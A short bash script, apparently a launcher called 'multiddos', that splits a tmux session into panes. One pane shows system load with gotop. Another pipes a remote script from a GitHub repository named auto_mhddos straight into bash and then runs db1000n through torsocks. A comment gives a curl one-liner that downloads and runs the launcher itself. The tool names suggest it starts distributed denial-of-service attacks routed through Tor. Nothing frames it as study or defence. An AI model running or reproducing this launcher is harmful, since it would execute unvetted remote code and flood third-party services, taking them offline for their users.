#!/bin/bash
# curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos_test.sh -o multiddos_test.sh && bash multiddos_test.sh
...
tmux new-session -s multiddos -d
sleep 0.1
tmux split-window -h -p 75 'gotop -asc solarized'
sleep 0.1
...
sleep 0.1
tmux split-window -v 'curl https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash
 && torsocks -i ./db1000n'
